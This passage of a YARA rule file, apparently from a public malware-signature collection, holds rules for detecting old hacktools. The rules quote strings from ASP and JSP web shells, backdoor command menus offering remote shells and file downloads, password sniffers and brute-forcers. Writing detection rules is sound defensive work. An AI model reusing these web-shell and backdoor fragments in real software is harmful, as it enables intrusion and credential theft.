\"b07702a381fa2eaee40b96ae2443918209674051\"\n\tstrings:\n\t\t$s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:\" ascii\n\t\t$s1 = \"@echo off\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule VUBrute_VUBrute {\n\tmeta:\n\t\tdescription = \"PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"22.11.14\"\n\t\tscore = 70\n\t\thash = \"166fa8c5a0ebb216c832ab61bf8872da556576a7\"\n\tstrings:\n\t\t$s0 = \"Text Files (*.txt);;All Files (*)\" fullword ascii\n\t\t$s1 = \"http://ubrute.com\" fullword ascii\n\t\t$s11 = \"IP - %d; Password - %d; Combination - %d\" fullword ascii\n\t\t$s14 = \"error.txt\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule DK_Brute {\n\tmeta:\n\t\tdescription = \"PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"22.11.14\"\n\t\tscore = 70\n\t\treference = \"http://goo.gl/xiIphp\"\n\t\thash = \"93b7c3a01c41baecfbe42461cb455265f33fbc3d\"\n\tstrings:\n\t\t$s6 = \"get_CrackedCredentials\" fullword ascii\n\t\t$s13 = \"Same port used for two different protocols:\" fullword wide\n\t\t$s18 = \"coded by fLaSh\" fullword ascii\n\t\t$s19 = \"get_grbToolsScaningCracking\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule VUBrute_config {\n\tmeta:\n\t\tdescription = \"PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"22.11.14\"\n\t\tscore = 70\n\t\treference = \"http://goo.gl/xiIphp\"\n\t\thash = \"b9f66b9265d2370dab887604921167c11f7d93e9\"\n\tstrings:\n\t\t$s2 = \"Restore=1\" fullword ascii\n\t\t$s6 = \"Thread=\" ascii\n\t\t$s7 = \"Running=1\" fullword ascii\n\t\t$s8 = \"CheckCombination=\" fullword ascii\n\t\t$s10 = \"AutoSave=1.000000\" fullword ascii\n\t\t$s12 = \"TryConnect=\" ascii\n\t\t$s13 = \"Tray=\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_hunt {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file hunt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"f9f059380d95c7f8d26152b1cb361d93492077ca\"\n\tstrings:\n\t\t$s1 = \"Programming by JD Glaser - All Rights Reserved\" fullword ascii\n\t\t$s3 = \"Usage - hunt \\\\\\\\servername\" fullword ascii\n\t\t$s4 = \".share = %S - %S\" fullword wide\n\t\t$s5 = \"SMB share enumerator and admin finder \" fullword ascii\n\t\t$s7 = \"Hunt only runs on Windows NT...\" fullword ascii\n\t\t$s8 = \"User = %S\" fullword ascii\n\t\t$s9 = \"Admin is %s\\\\%s\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_listip {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file listip.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"f32a0c5bf787c10eb494eb3b83d0c7a035e7172b\"\n\tstrings:\n\t\t$s0 = \"ERROR!!! Bad host lookup. Program Terminate.\" fullword ascii\n\t\t$s2 = \"ERROR No.2!!! Program Terminate.\" fullword ascii\n\t\t$s4 = \"Local Host Name: %s\" fullword ascii\n\t\t$s5 = \"Packed by exe32pack 1.38\" fullword ascii\n\t\t$s7 = \"Local Computer Name: %s\" fullword ascii\n\t\t$s8 = \"Local IP Adress: %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule ArtTrayHookDll {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"4867214a3d96095d14aa8575f0adbb81a9381e6c\"\n\tstrings:\n\t\t$s0 = \"ArtTrayHookDll.dll\" fullword ascii\n\t\t$s7 = \"?TerminateHook@@YAXXZ\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_eee {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file eee.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"236916ce2980c359ff1d5001af6dacb99227d9cb\"\n\tstrings:\n\t\t$s0 = \"szj1230@yesky.com\" fullword wide\n\t\t$s3 = \"C:\\\\Program Files\\\\DevStudio\\\\VB\\\\VB5.OLB\" fullword ascii\n\t\t$s4 = \"MailTo:szj1230@yesky.com\" fullword wide\n\t\t$s5 = \"Command1_Click\" fullword ascii\n\t\t$s7 = \"software\\\\microsoft\\\\internet explorer\\\\typedurls\" fullword wide\n\t\t$s11 = \"vb5chs.dll\" fullword ascii\n\t\t$s12 = \"MSVBVM50.DLL\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_asp4 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp4.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"faf991664fd82a8755feb65334e5130f791baa8c\"\n\tstrings:\n\t\t$s0 = \"system.dll\" fullword ascii\n\t\t$s2 = \"set sys=server.CreateObject (\\\"system.contral\\\") \" fullword ascii\n\t\t$s3 = \"Public Function reboot(atype As Variant)\" fullword ascii\n\t\t$s4 = \"t& = ExitWindowsEx(1, atype)\" ascii\n\t\t$s5 = \"atype=request(\\\"atype\\\") \" fullword ascii\n\t\t$s7 = \"AceiveX dll\" fullword ascii\n\t\t$s8 = \"Declare Function ExitWindowsEx Lib \\\"user32\\\" (ByVal uFlags As Long, ByVal \" ascii\n\t\t$s10 = \"sys.reboot(atype)\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspfile1 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file aspfile1.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"77b1e3a6e8f67bd6d16b7ace73dca383725ac0af\"\n\tstrings:\n\t\t$s0 = \"' -- check for a command that we have posted -- '\" fullword ascii\n\t\t$s1 = \"szTempFile = \\\"C:\\\\\\\" & oFileSys.GetTempName( )\" fullword ascii\n\t\t$s5 = \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\"><BODY>\" fullword ascii\n\t\t$s6 = \"<input type=text name=\\\".CMD\\\" size=45 value=\\\"<%= szCMD %>\\\">\" fullword ascii\n\t\t$s8 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword ascii\n\t\t$s15 = \"szCMD = Request.Form(\\\".CMD\\\")\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule EditServer_HackTool {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EditServer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"87b29c9121cac6ae780237f7e04ee3bc1a9777d3\"\n\tstrings:\n\t\t$s0 = \"%s Server.exe\" fullword ascii\n\t\t$s1 = \"Service Port: %s\" fullword ascii\n\t\t$s2 = \"The Port Must Been >0 & <65535\" fullword ascii\n\t\t$s8 = \"3--Set Server Port\" fullword ascii\n\t\t$s9 = \"The Server Password Exceeds 32 Characters\" fullword ascii\n\t\t$s13 = \"Service Name: %s\" fullword ascii\n\t\t$s14 = \"Server Password: %s\" fullword ascii\n\t\t$s17 = \"Inject Process Name: %s\" fullword ascii\n\n\t\t$x1 = \"WinEggDrop Shell Congirator\" fullword ascii\n\tcondition:\n\t\t5 of ($s*) or $x1\n}\n\nrule sig_238_letmein {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file letmein.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"74d223a56f97b223a640e4139bb9b94d8faa895d\"\n\tstrings:\n\t\t$s1 = \"Error get globalgroup memebers: NERR_InvalidComputer\" fullword ascii\n\t\t$s6 = \"Error get users from server!\" fullword ascii\n\t\t$s7 = \"get in nt by name and null\" fullword ascii\n\t\t$s16 = \"get something from nt, hold by killusa.\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_token {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file token.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14\"\n\tstrings:\n\t\t$s0 = \"Logon.exe\" fullword ascii\n\t\t$s1 = \"Domain And User:\" fullword ascii\n\t\t$s2 = \"PID=Get Addr$(): One\" fullword ascii\n\t\t$s3 = \"Process \" fullword ascii\n\t\t$s4 = \"psapi.dllK\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_TELNET {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"50d02d77dc6cc4dc2674f90762a2622e861d79b1\"\n\tstrings:\n\t\t$s0 = \"TELNET [host [port]]\" fullword wide\n\t\t$s2 = \"TELNET.EXE\" fullword wide\n\t\t$s4 = \"Microsoft(R) Windows(R) Millennium Operating System\" fullword wide\n\t\t$s14 = \"Software\\\\Microsoft\\\\Telnet\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule snifferport {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file snifferport.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d14133b5eaced9b7039048d0767c544419473144\"\n\tstrings:\n\t\t$s0 = \"iphlpapi.DLL\" fullword ascii\n\t\t$s5 = \"ystem\\\\CurrentCorolSet\\\\\" fullword ascii\n\t\t$s11 = \"Port.TX\" fullword ascii\n\t\t$s12 = \"32Next\" fullword ascii\n\t\t$s13 = \"V1.2 B\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_webget {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file webget.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"36b5a5dee093aa846f906bbecf872a4e66989e42\"\n\tstrings:\n\t\t$s0 = \"Packed by exe32pack\" ascii\n\t\t$s1 = \"GET A HTTP/1.0\" fullword ascii\n\t\t$s2 = \" error \" fullword ascii\n\t\t$s13 = \"Downloa\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule XYZCmd_zip_Folder_XYZCmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file XYZCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"bbea5a94950b0e8aab4a12ad80e09b630dd98115\"\n\tstrings:\n\t\t$s0 = \"Executes Command Remotely\" fullword wide\n\t\t$s2 = \"XYZCmd.exe\" fullword wide\n\t\t$s6 = \"No Client Software\" fullword wide\n\t\t$s19 = \"XYZCmd V1.0 For NT S\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule ASPack_Chinese {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ASPack Chinese.ini\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"02a9394bc2ec385876c4b4f61d72471ac8251a8e\"\n\tstrings:\n\t\t$s0 = \"= Click here if you want to get your registered copy of ASPack\" fullword ascii\n\t\t$s1 = \";  For beginning of translate - copy english.ini into the yourlanguage.ini\" fullword ascii\n\t\t$s2 = \"E-Mail:                      shinlan@km169.net\" fullword ascii\n\t\t$s8 = \";  Please, translate text only after simbol '='\" fullword ascii\n\t\t$s19 = \"= Compress with ASPack\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_EDIR {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EDIR.ASP\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"03367ad891b1580cfc864e8a03850368cbf3e0bb\"\n\tstrings:\n\t\t$s1 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n\t\t$s3 = \"if Request.Cookies(\\\"password\\\")=\\\"\" ascii\n\t\t$s6 = \"whichdir=server.mappath(Request(\\\"path\\\"))\" fullword ascii\n\t\t$s7 = \"Set fs = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n\t\t$s19 = \"whichdir=Request(\\\"path\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_filespy {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file filespy.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 50\n\t\thash = \"89d8490039778f8c5f07aa7fd476170293d24d26\"\n\tstrings:\n\t\t$s0 = \"Hit [Enter] to begin command mode...\" fullword ascii\n\t\t$s1 = \"If you are in command mode,\" fullword ascii\n\t\t$s2 = \"[/l] lists all the drives the monitor is currently attached to\" fullword ascii\n\t\t$s9 = \"FileSpy.exe\" fullword wide\n\t\t$s12 = \"ERROR starting FileSpy...\" fullword ascii\n\t\t$s16 = \"exe\\\\filespy.dbg\" fullword ascii\n\t\t$s17 = \"[/d <drive>] detaches monitor from <drive>\" fullword ascii\n\t\t$s19 = \"Should be logging to screen...\" fullword ascii\n\t\t$s20 = \"Filmon:  Unknown log record type\" fullword ascii\n\tcondition:\n\t\t7 of them\n}\n\nrule ByPassFireWall_zip_Folder_Ie {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Ie.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d1b9058f16399e182c9b78314ad18b975d882131\"\n\tstrings:\n\t\t$s0 = \"d:\\\\documents and settings\\\\loveengeng\\\\desktop\\\\source\\\\bypass\\\\lcc\\\\ie.dll\" fullword ascii\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s5 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s7 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule EditKeyLogReadMe {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"dfa90540b0e58346f4b6ea12e30c1404e15fbe5a\"\n\tstrings:\n\t\t$s0 = \"editKeyLog.exe KeyLog.exe,\" fullword ascii\n\t\t$s1 = \"WinEggDrop.DLL\" fullword ascii\n\t\t$s2 = \"nc.exe\" fullword ascii\n\t\t$s3 = \"KeyLog.exe\" fullword ascii\n\t\t$s4 = \"EditKeyLog.exe\" fullword ascii\n\t\t$s5 = \"wineggdrop\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule PassSniffer_zip_Folder_readme {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file readme.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a52545ae62ddb0ea52905cbb61d895a51bfe9bcd\"\n\tstrings:\n\t\t$s0 = \"PassSniffer.exe\" fullword ascii\n\t\t$s1 = \"POP3/FTP Sniffer\" fullword ascii\n\t\t$s2 = \"Password Sniffer V1.0\" fullword ascii\n\tcondition:\n\t\t1 of them\n}\n\nrule sig_238_gina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file gina.reg\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"324acc52566baf4afdb0f3e4aaf76e42899e0cf6\"\n\tstrings:\n\t\t$s0 = \"\\\"gina\\\"=\\\"gina.dll\\\"\" fullword ascii\n\t\t$s1 = \"REGEDIT4\" fullword ascii\n\t\t$s2 = \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon]\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule splitjoin {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file splitjoin.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e4a9ef5d417038c4c76b72b5a636769a98bd2f8c\"\n\tstrings:\n\t\t$s0 = \"Not for distribution without the authors permission\" fullword wide\n\t\t$s2 = \"Utility to split and rejoin files.0\" fullword wide\n\t\t$s5 = \"Copyright (c) Angus Johnson 2001-2002\" fullword wide\n\t\t$s19 = \"SplitJoin\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule EditKeyLog {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EditKeyLog.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a450c31f13c23426b24624f53873e4fc3777dc6b\"\n\tstrings:\n\t\t$s1 = \"Press Any Ke\" fullword ascii\n\t\t$s2 = \"Enter 1 O\" fullword ascii\n\t\t$s3 = \"Bon >0 & <65535L\" fullword ascii\n\t\t$s4 = \"--Choose \" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule PassSniffer {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file PassSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f\"\n\tstrings:\n\t\t$s2 = \"Sniff\" fullword ascii\n\t\t$s3 = \"GetLas\" fullword ascii\n\t\t$s4 = \"VersionExA\" fullword ascii\n\t\t$s10 = \" Only RuntUZ\" fullword ascii\n\t\t$s12 = \"emcpysetprintf\\\\\" fullword ascii\n\t\t$s13 = \"WSFtartup\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspfile2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file aspfile2.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"14efbc6cb01b809ad75a535d32b9da4df517ff29\"\n\tstrings:\n\t\t$s0 = \"response.write \\\"command completed success!\\\" \" fullword ascii\n\t\t$s1 = \"for each co in foditems \" fullword ascii\n\t\t$s3 = \"<input type=text name=text6 value=\\\"<%= szCMD6 %>\\\"><br> \" fullword ascii\n\t\t$s19 = \"<title>Hello! Welcome </title>\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule UnPack_rar_Folder_InjectT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InjectT.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6\"\n\tstrings:\n\t\t$s0 = \"%s -Install                          -->To Install The Service\" fullword ascii\n\t\t$s1 = \"Explorer.exe\" fullword ascii\n\t\t$s2 = \"%s -Start                            -->To Start The Service\" fullword ascii\n\t\t$s3 = \"%s -Stop                             -->To Stop The Service\" fullword ascii\n\t\t$s4 = \"The Port Is Out Of Range\" fullword ascii\n\t\t$s7 = \"Fail To Set The Port\" fullword ascii\n\t\t$s11 = \"\\\\psapi.dll\" fullword ascii\n\t\t$s20 = \"TInject.Dll\" fullword ascii\n\n\t\t$x1 = \"Software\\\\Microsoft\\\\Internet Explorer\\\\WinEggDropShell\" fullword ascii\n\t\t$x2 = \"injectt.exe\" fullword ascii\n\tcondition:\n\t\t( 1 of ($x*) ) and ( 3 of ($s*) )\n}\n\nrule Jc_WinEggDrop_Shell {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"820674b59f32f2cf72df50ba4411d7132d863ad2\"\n\tstrings:\n\t\t$s0 = \"Sniffer.dll\" fullword ascii\n\t\t$s4 = \":Execute net.exe user Administrator pass\" fullword ascii\n\t\t$s5 = \"Fport.exe or mport.exe \" fullword ascii\n\t\t$s6 = \":Password Sniffering Is Running |Not Running \" fullword ascii\n\t\t$s9 = \": The Terminal Service Port Has Been Set To NewPort\" fullword ascii\n\t\t$s15 = \": Del www.exe                   \" fullword ascii\n\t\t$s20 = \":Dir *.exe                    \" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule aspbackdoor_asp1 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp1.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"9ef9f34392a673c64525fcd56449a9fb1d1f3c50\"\n\tstrings:\n\t\t$s0 = \"param = \\\"driver={Microsoft Access Driver (*.mdb)}\\\" \" fullword ascii\n\t\t$s1 = \"conn.Open param & \\\";dbq=\\\" & Server.MapPath(\\\"scjh.mdb\\\") \" fullword ascii\n\t\t$s6 = \"set rs=conn.execute (sql)%> \" fullword ascii\n\t\t$s7 = \"<%set Conn = Server.CreateObject(\\\"ADODB.Connection\\\") \" fullword ascii\n\t\t$s10 = \"<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh \" fullword ascii\n\t\t$s15 = \"sql=\\\"select * from scjh\\\" \" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule QQ_zip_Folder_QQ {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file QQ.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb\"\n\tstrings:\n\t\t$s0 = \"EMAIL:haoq@neusoft.com\" fullword wide\n\t\t$s1 = \"EMAIL:haoq@neusoft.com\" fullword wide\n\t\t$s4 = \"QQ2000b.exe\" fullword wide\n\t\t$s5 = \"haoq@neusoft.com\" fullword ascii\n\t\t$s9 = \"QQ2000b.exe\" fullword ascii\n\t\t$s10 = \"\\\\qq2000b.exe\" fullword ascii\n\t\t$s12 = \"WINDSHELL STUDIO[WINDSHELL \" fullword wide\n\t\t$s17 = \"SOFTWARE\\\\HAOQIANG\\\\\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule UnPack_rar_Folder_TBack {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TBack.DLL\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"30fc9b00c093cec54fcbd753f96d0ca9e1b2660f\"\n\tstrings:\n\t\t$s0 = \"Redirect SPort RemoteHost RPort       -->Port Redirector\" fullword ascii\n\t\t$s1 = \"http://IP/a.exe a.exe                 -->Download A File\" fullword ascii\n\t\t$s2 = \"StopSniffer                           -->Stop Pass Sniffer\" fullword ascii\n\t\t$s3 = \"TerminalPort Port                     -->Set New Terminal Port\" fullword ascii\n\t\t$s4 = \"Example: Http://12.12.12.12/a.exe abc.exe\" fullword ascii\n\t\t$s6 = \"Create Password Sniffering Thread Successfully. Status:Logging\" fullword ascii\n\t\t$s7 = \"StartSniffer NIC                      -->Start Sniffer\" fullword ascii\n\t\t$s8 = \"Shell                                 -->Get A Shell\" fullword ascii\n\t\t$s11 = \"DeleteService ServiceName             -->Delete A Service\" fullword ascii\n\t\t$s12 = \"Disconnect ThreadNumber|All           -->Disconnect Others\" fullword ascii\n\t\t$s13 = \"Online                                -->List All Connected IP\" fullword ascii\n\t\t$s15 = \"Getting The UserName(%c%s%c)-->ID(0x%s) Successfully\" fullword ascii\n\t\t$s16 = \"Example: Set REG_SZ Test Trojan.exe\" fullword ascii\n\t\t$s18 = \"Execute Program                       -->Execute A Program\" fullword ascii\n\t\t$s19 = \"Reboot                                -->Reboot The System\" fullword ascii\n\t\t$s20 = \"Password Sniffering Is Not Running\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule sig_238_cmd_2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file cmd.jsp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"be4073188879dacc6665b6532b03db9f87cfc2bb\"\n\tstrings:\n\t\t$s0 = \"Process child = Runtime.getRuntime().exec(\" ascii\n\t\t$s1 = \"InputStream in = child.getInputStream();\" fullword ascii\n\t\t$s2 = \"String cmd = request.getParameter(\\\"\" ascii\n\t\t$s3 = \"while ((c = in.read()) != -1) {\" fullword ascii\n\t\t$s4 = \"<%@ page import=\\\"java.io.*\\\" %>\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule RangeScan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file RangeScan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"bace2c65ea67ac4725cb24aa9aee7c2bec6465d7\"\n\tstrings:\n\t\t$s0 = \"RangeScan.EXE\" fullword wide\n\t\t$s4 = \"<br><p align=\\\"center\\\"><b>RangeScan \" fullword ascii\n\t\t$s9 = \"Produced by isn0\" fullword ascii\n\t\t$s10 = \"RangeScan\" fullword wide\n\t\t$s20 = \"%d-%d-%d %d:%d:%d\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule XYZCmd_zip_Folder_Readme {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Readme.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"967cb87090acd000d22e337b8ce4d9bdb7c17f70\"\n\tstrings:\n\t\t$s3 = \"3.xyzcmd \\\\\\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe\" fullword ascii\n\t\t$s20 = \"XYZCmd V1.0\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule ByPassFireWall_zip_Folder_Inject {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Inject.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"34f564301da528ce2b3e5907fd4b1acb7cb70728\"\n\tstrings:\n\t\t$s6 = \"Fail To Inject\" fullword ascii\n\t\t$s7 = \"BtGRemote Pro; V1.5 B/{\" fullword ascii\n\t\t$s11 = \" Successfully\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_sqlcmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 40\n\t\thash = \"b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a\"\n\tstrings:\n\t\t$s0 = \"Permission denial to EXEC command.:(\" fullword ascii\n\t\t$s3 = \"by Eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s4 = \"Connect to %s MSSQL server success.Enjoy the shell.^_^\" fullword ascii\n\t\t$s5 = \"Usage: %s <host> <uid> <pwd>\" fullword ascii\n\t\t$s6 = \"SqlCmd2.exe Inside Edition.\" fullword ascii\n\t\t$s7 = \"Http://www.patching.net  2000/12/14\" fullword ascii\n\t\t$s11 = \"Example: %s 192.168.0.1 sa \\\"\\\"\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule ASPack_ASPACK {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ASPACK.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"c589e6fd48cfca99d6335e720f516e163f6f3f42\"\n\tstrings:\n\t\t$s0 = \"ASPACK.EXE\" fullword wide\n\t\t$s5 = \"CLOSEDFOLDER\" fullword wide\n\t\t$s10 = \"ASPack compressor\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_2323 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file 2323.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21812186a9e92ee7ddc6e91e4ec42991f0143763\"\n\tstrings:\n\t\t$s0 = \"port - Port to listen on, defaults to 2323\" fullword ascii\n\t\t$s1 = \"Usage: srvcmd.exe [/h] [port]\" fullword ascii\n\t\t$s3 = \"Failed to execute shell\" fullword ascii\n\t\t$s5 = \"/h   - Hide Window\" fullword ascii\n\t\t$s7 = \"Accepted connection from client at %s\" fullword ascii\n\t\t$s9 = \"Error %d: %s\" fullword 